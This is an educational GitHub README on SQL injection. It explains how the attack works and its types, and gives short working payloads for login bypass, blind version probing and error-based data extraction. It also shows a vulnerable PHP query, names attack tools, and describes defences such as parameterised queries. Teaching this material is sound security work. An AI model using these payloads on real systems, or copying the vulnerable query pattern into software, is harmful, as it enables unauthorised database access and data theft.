# SQL Injection Tutorial

![License](https://img.shields.io/badge/license-MIT-blue.svg)

This repository provides a **professional and educational guide to SQL Injection** techniques used in ethical hacking and penetration testing. The goal is to help security researchers, students, and developers understand how SQL Injection works and how to defend against it.

**Made by: [Ghaith](https://github.com/ghaithrb/sql-injection-tutorial)**

---

## Table of Contents

- [What is SQL Injection?](#what-is-sql-injection)
- [How It Works](#how-it-works)
- [Malicious Input Example](#malicious-input-example)
- [Types of SQL Injection](#types-of-sql-injection)
- [Examples](#examples)
  - [Classic SQL Injection](#classic-sql-injection)
  - [Blind SQL Injection](#blind-sql-injection)
  - [Error-Based Injection](#error-based-injection)
- [Tools](#tools)
- [Defense Techniques](#defense-techniques)
- [Legal Disclaimer](#legal-disclaimer)
- [License](#license)

---

## What is SQL Injection?

SQL Injection is a **code injection technique** that exploits vulnerabilities in an application’s software by manipulating SQL queries. It allows attackers to **interact with the database** in unauthorized ways — retrieving data, bypassing logins, or even dropping tables.

---

## How It Works

Consider this SQL query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

If an attacker enters:

```sql
' OR '1'='1
```

The query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

This condition is always true, and the attacker is granted access.

---

## Malicious Input Example

Example vulnerable PHP code:

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Malicious input:

```sql
' OR '1'='1
```

---

## Types of SQL Injection

| Type              | Description                                      |
|-------------------|--------------------------------------------------|
| Classic           | Injected SQL code returns visible data           |
| Blind             | No visible output; use logic-based inference     |
| Time-Based Blind  | Uses SQL functions like `SLEEP()` to detect logic|
| Error-Based       | Uses DB error messages to extract data           |
| Out-of-Band       | Uses secondary channels (DNS, HTTP) for output   |

---

## Examples

### Classic SQL Injection

```sql
' OR 1=1 --
```

Bypasses login forms.

---

### Blind SQL Injection

```sql
' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --
```

No visible output — must infer true/false.

---

### Error-Based Injection

```sql
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects)) --
```

Triggers SQL errors to reveal data.

---

## Tools

- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [Havij](https://en.wikipedia.org/wiki/Havij)
- [Burp Suite](https://portswigger.net/burp)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [jSQL Injection](https://github.com/ron190/jsql-injection)

---

## Defense Techniques

### Use Prepared Statements (Parameterized Queries)

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### Input Validation

Validate and sanitize all user input.

### Use ORM (Object-Relational Mapping)

Tools like SQLAlchemy or Hibernate abstract queries safely.

### Least Privilege Principle

Ensure the database user has only the necessary rights.

### Web Application Firewall (WAF)

Use tools like ModSecurity, AWS WAF, or Cloudflare WAF.

---

## Legal Disclaimer

> This content is intended for **educational purposes only**. Performing SQL Injection attacks on systems that you do not own or have explicit permission to test is **illegal** and unethical. Always practice **responsible disclosure** and use your knowledge for constructive, defensive purposes.

---

## License

This project is licensed under the [MIT License](LICENSE).
